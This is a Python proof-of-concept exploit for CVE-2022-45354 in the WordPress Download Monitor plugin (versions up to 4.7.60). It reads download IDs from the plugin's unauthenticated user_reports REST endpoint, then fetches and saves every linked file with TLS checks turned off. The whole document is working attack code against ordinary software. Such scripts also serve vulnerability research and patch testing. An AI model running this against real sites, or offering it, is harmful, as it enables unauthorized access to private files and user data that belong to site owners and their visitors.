#!/usr/bin/env python3

"""
CVE-2022-45354

Download Monitor <= 4.7.60 - Sensitive Information Exposure via REST API
by random-robbie

Script to generate download links for unique download IDs from the
WordPress Download Monitor plugin and download the files.

Usage:
    python download_link_generator.py <URL>
"""

import argparse
import os
import re
import requests
from urllib.parse import urljoin


# Disable SSL verification warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_user_reports(response):
    try:
        data = response.json()
        logs = data["logs"]

        download_ids = set()
        for log in logs:
            download_id = log["download_id"]
            download_ids.add(download_id)

        base_url = response.url.split("/wp-json")[0]
        for download_id in download_ids:
            download_url = urljoin(base_url, f"/download/{download_id}/")
            yield download_url
    except (KeyError, ValueError) as e:
        print(f"Error parsing JSON response: {e}")


def extract_filename(content_disposition):
    # Extracts the filename from the Content-Disposition header
    # Handles cases where the filename is encoded with UTF-8 and surrounded by single quotes or double quotes

    # Regex pattern to match the filename
    pattern = r"filename\*=UTF-8''([\w.%+-]+)"

    matches = re.findall(pattern, content_disposition)
    if matches:
        return matches[0]
    else:
        # If the pattern doesn't match, fall back to extracting the filename without encoding
        filename_match = re.search(r'filename="([^"]+)"', content_disposition)
        if filename_match:
            return filename_match.group(1)
        else:
            return None


def download_file(url, output_folder):
    try:
        response = requests.get(url, verify=False)

        if response.status_code == 200:
            # Extract file name from the Content-Disposition header
            content_disposition = response.headers.get("Content-Disposition")
            if content_disposition:
                filename = extract_filename(content_disposition)
            else:
                # If Content-Disposition header is not available, use the last portion of the URL as the filename
                filename = url.split("/")[-1]

            # Create the output folder if it doesn't exist
            os.makedirs(output_folder, exist_ok=True)

            # Save the file
            filepath = os.path.join(output_folder, filename)
            with open(filepath, "wb") as f:
                f.write(response.content)

            print(f"Downloaded: {filename}")
        else:
            print(f"Failed to download: {url} [Status code: {response.status_code}]")
    except requests.RequestException as e:
        print(f"Error occurred during download: {e}")


def main():
    print(r"""
    CVE-2022-45354
    
    Download Monitor <= 4.7.60 - Sensitive Information Exposure via REST API
                            by random-robbie
    """)

    parser = argparse.ArgumentParser(description="Download ID Link Generator")
    parser.add_argument("url", help="URL to the WordPress site")
    parser.add_argument("-o", "--output", default="downloads", help="Output folder for downloaded files")

    args = parser.parse_args()

    url = args.url.rstrip("/")
    endpoint = f"{url}/wp-json/download-monitor/v1/user_reports"
    output_folder = args.output

    # Create a session and ignore SSL verification
    session = requests.Session()
    session.verify = False

    try:
        response = session.get(endpoint)
        if response.status_code == 200:
            download_links = parse_user_reports(response)
            for link in download_links:
                download_file(link, output_folder)
        else:
            print(f"Request failed with status code {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred during the request: {e}")


if __name__ == "__main__":
    main()
